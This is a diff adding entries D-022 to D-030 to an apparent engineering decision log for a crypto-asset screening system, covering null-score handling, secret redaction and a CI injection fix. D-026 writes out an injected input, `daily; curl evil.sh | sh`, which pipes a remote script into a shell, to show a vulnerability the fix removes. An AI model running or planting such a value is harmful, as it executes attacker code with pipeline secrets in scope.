@@ -573,3 +573,213 @@ three pixels to the left of each figure. At that size, against a tabular
 numeral, the arrow reads as a minus sign — so the disqualified count rendered
 as "−321". Wrong, and alarming, on the one number the page most wants
 understood. The arrows now sit centred in a wider gutter.
+
+---
+
+## D-022 — Missing unlock data no longer scores as the best possible case
+**Date:** 2026-09-10 · **Status:** accepted
+
+`days_to_next_major_unlock` is null for two opposite reasons: we hold a vesting
+schedule and there is no cliff ahead (the best case in the events block), or we
+hold no unlock record at all (we know nothing). The events block filled both
+with `9999` and percentiled the result, so every asset we had no supply data
+for landed in the top percentile for unlock distance.
+
+The code carried a comment justifying it — that L1 had already required event
+data. It had not. `L1_UNLOCK` returns `_unknown()` when `has_event_data` is
+false, and an unknown check passes; the same run that found this reported
+`L1_UNLOCK coverage=0.4%`, so the dark branch was the common case, not the
+exception. A load-bearing assumption stated in a comment and contradicted by
+the code it defends.
+
+`EventFeatures` now exposes `has_unlock_record` (narrower than `has_event_data`:
+an asset with a mainnet date on file but no vesting schedule has event data and
+still nothing to say about its next cliff). Only assets with a real unlock
+record get the top-of-range treatment; the rest score `None` and the weight
+redistributes across the metrics that were measured.
+
+**On today's data this changes no ordering**, because unlock coverage is 0.4%
+and the metric was uniform either way. It matters at partial coverage — which
+is the state the system is heading towards — where the old code would have
+ranked the assets it knew least about highest.
+
+---
+
+## D-023 — Sector relative strength requires its benchmark
+**Date:** 2026-09-10 · **Status:** accepted
+
+With BTC's return missing, `score_sector` substituted the cross-sectional mean.
+That silently redefines the metric: sector strength against the screened
+universe is a different quantity from sector strength against BTC, and BTC is
+not even in the pool being averaged. The label `sector_rs` stayed the same, so
+nothing downstream could tell which of the two it was looking at.
+
+A missing benchmark now yields `NaN` for the window, logs
+`sector_rs_no_benchmark`, and the block renormalises over whatever else was
+measured. Nothing claims to be a BTC comparison that is not one.
+
+---
+
+## D-024 — An unscorable asset is omitted from the ranking, not scored zero
+**Date:** 2026-09-10 · **Status:** accepted
+
+`_clean(row["total_score"]) or 0.0` collapsed a null total to `0.0`. Since
+`layer2_result.total_score` is `NOT NULL` the choice is between omitting the
+row and inventing a number, and inventing one is worse than it first appears:
+the row then occupies a rank, enters the journal as a signal, and its forward
+return is attributed to a score that was never computed.
+
+`run_layer2` now skips such rows and logs `layer2_unscorable_assets` with the
+count and the tickers. `_build_entry` refuses a *signal* with a null score for
+the same reason, one layer further on — `journal_entry` is append-only and
+defended by triggers, so a fabricated score written there can never be
+corrected. A *control* keeps its explicit `rank 0 / score 0.0` sentinel, which
+is a statement that it was never ranked, and is the whole point of it.
+
+Reachable today? No: the boolean event flags always produce a measurement, so
+no asset totals `NaN` on the live universe (`unscorable=0`). Fixed anyway,
+because the guard costs nothing and the failure it prevents is unrecoverable.
+
+---
+
+## D-025 — A credential is redacted by shape, not only by field name
+**Date:** 2026-09-10 · **Status:** accepted
+
+A security pass found a live leak path. CryptoPanic takes its auth token as a
+URL **query parameter**; httpx builds its exception message from the full
+request URL; and the collector logged `error=str(exc)`. `_redact_secrets`
+inspected field *names* only, and the field was called `error` — so the token
+would have ridden into a JSON log that CI uploads as an artifact from a public
+repository.
+
+Three independent layers now:
+
+1. `redact_url()` + `PermanentHTTPError` in `collectors/base.py`, replacing
+   `response.raise_for_status()`. The query string never enters the exception.
+2. `_SECRET_VALUE_PATTERNS` in `logging_setup.py`: a second pass over every
+   string **value**, so a credential is caught whatever field it sits in.
+3. `scrub_secrets()` applied where `collector_run.error_message` is *built*,
+   not where it is logged — because that column is republished in
+   `data/public/health.json` and reaches a public page without passing through
+   the log processor at all.
+
+**A bug found while fixing the bug, worth recording on its own.** The Telegram
+bot-token pattern was written into the file as a literal backspace byte where
+`\b` was intended. It compiled without complaint and matched nothing. A
+redactor that silently fails to redact is worse than none, because it is
+trusted; the seven-shape verification that caught it is now
+`tests/test_secret_redaction.py`.
+
+---
+
+## D-026 — A dispatch input never reaches a `run:` block
+**Date:** 2026-09-10 · **Status:** accepted
+
+`run: python -m src.cli collect ${{ inputs.tier }}` substitutes the input into
+the shell script *before* the shell parses it, so `daily; curl evil.sh | sh`
+executes as two commands with every job secret in scope. Quoting the expression
+does not help — the value can contain quotes. Four sites were affected
+(`collect-daily.yml` twice, `collect-hourly.yml`, `screen.yml`).
+
+Every input is now bound under `env:` and read as `"$VAR"`, where it is data
+the shell never re-parses. `screen.yml` uses an `if [ -n "$RUN_DATE" ]` branch
+so the empty case is a genuinely absent flag rather than an empty `--date`.
+
+The unsafe form reads more naturally than the safe one, so it will come back:
+`ci.yml` gained a guard alongside the `on: schedule` one. Verified both ways —
+it passes on the current tree and fails on a tree with the interpolation
+re-introduced.
+
+---
+
+## D-027 — `rollback()` is a no-op on Turso, and says so
+**Date:** 2026-09-10 · **Status:** accepted
+
+The libSQL HTTP client autocommits every `execute` and every `batch`, so there
+is no open transaction for `commit()` or `rollback()` to act on. A pipeline
+that fails halfway leaves its earlier writes **committed** on Turso while the
+same failure on local sqlite rolls the whole run back. The two backends do not
+behave the same.
+
+Not papered over with a fake transaction, because the real mitigation is
+already in place and is stronger: every writer goes through `upsert()`, keyed on
+`(run_date, base_asset)` or the table's natural key, so re-running a failed day
+overwrites partial rows rather than appending duplicates — which is exactly
+what the external cron does anyway. `journal_entry` is the one table not
+covered by that argument, and it is append-only with a deterministic
+`entry_id` written `INSERT OR IGNORE`, so it heals on re-run without mutating
+anything already recorded.
+
+`rollback()` now logs `rollback_unavailable` on the libSQL backend, and its
+docstring states the constraint plus the one rule that follows from it: a
+future table that is neither idempotent on re-run nor append-only must not
+depend on this method.
+
+---
+
+## D-028 — Coverage reports the snapshot the screen actually used
+**Date:** 2026-09-10 · **Status:** accepted
+
+`_coverage` counted rows where `snapshot_date = run_date`. But `load_snapshots`
+and `load_scoring_frame` both resolve `MAX(snapshot_date) <= run_date`, so a
+day where collection has not yet run is screened on yesterday's rows —
+deliberately. The report therefore printed 0% coverage for every input table on
+a run that had just ranked 207 assets, which reads as a total collection
+outage.
+
+This is the same "two different zeroes" confusion the dashboard already guards
+against on the funnel: *nothing was collected* and *today's ranking was built
+on older data* are different problems with different responses, and a single
+0% cannot distinguish them.
+
+Coverage now resolves the same date the screen resolved, reports it as `as_of`
+with an `age_days`, and shows an em dash where a table holds nothing at all.
+The same run then reads honestly: market 86.2% at 1d, derivatives 100% at 1d,
+fundamentals 2.3% at 1d, and holder/supply/attention genuinely empty.
+
+---
+
+## D-029 — The report says which blocks separated nothing
+**Date:** 2026-09-10 · **Status:** accepted
+
+Coverage answers "was there a row". It does not answer whether a block
+distinguished one asset from another, and the two come apart badly and quietly.
+Today's run is the example: the events block scored an identical 50.0 for all
+207 survivors, and the attention block was not scored at all — 25 of 110
+weight, 23%, contributing no information.
+
+A constant changes no ordering, so nothing looks wrong anywhere. But the reader
+believes six things were weighed when four were, and the score's apparent
+precision is borrowed from blocks that said nothing.
+
+Reported, never corrected: `data_quality()` gained `blocks` (weight, assets
+scored, distinct values, `informative`), rendered in the daily report and on
+the dashboard's Health page. Renormalising a zero-variance block away would be
+a threshold change, and per guardrail 18.4 those are recorded decisions rather
+than silent adjustments.
+
+---
+
+## D-030 — CLS: 0.05 measured in the browser, 0.97 in Lighthouse's simulation
+**Date:** 2026-09-10 · **Status:** accepted, with a known limitation
+
+A performance trace of the built site reports CLS **0.0465** — inside the
+"good" band (≤0.1). Lighthouse reports 0.97 for the same build. The difference
+is Lighthouse's *simulated* throttling (562 ms request latency, 4x CPU): under
+that model the JSON and the web fonts land long after first paint, and the
+footer travels most of a page height when the content finally renders.
+
+Two shifts are real, per the trace: the footer moving as content arrives
+(0.0453) and the Inter / IBM Plex Mono swap (0.0012). `<main>` gained a
+`min-h-[70vh]` floor, which helps and costs nothing.
+
+Not done, deliberately: eliminating the font shift needs `font-display:
+optional` or a system-font stack, both of which change how the page looks on a
+first visit. That is a design decision rather than a metric fix, and it is
+recorded here rather than made quietly. Accessibility, best practices and SEO
+all measure 100.
+
+**A smaller thing fixed while measuring:** every page load took a 404 on
+`/favicon.ico`. Harmless, but it is noise in exactly the console a reader would
+check first when something looks wrong. Now an inline SVG data URI — no extra
+request, no committed binary.
